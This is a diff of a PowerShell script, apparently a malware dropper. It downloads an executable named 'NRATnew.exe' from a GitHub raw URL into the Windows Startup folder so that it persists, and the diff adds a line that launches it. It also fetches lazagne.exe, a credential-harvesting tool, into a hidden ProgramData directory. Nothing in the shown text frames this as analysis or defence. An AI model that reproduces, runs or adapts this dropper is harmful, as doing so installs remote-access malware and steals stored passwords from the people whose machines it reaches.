@@ -24,6 +24,7 @@ start svchost.exe
 $source = "https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/NRATnew.exe"
 $destination = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\NRATnew.exe"
 Invoke-WebRequest -Uri $source -OutFile $destination
+start NRATnew.exe
 $source = "https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/lazagne.exe"
 $destination = "C:\ProgramData\zDATAxd\PersShell\lazagne.exe"
 Invoke-WebRequest -Uri $source -OutFile $destination
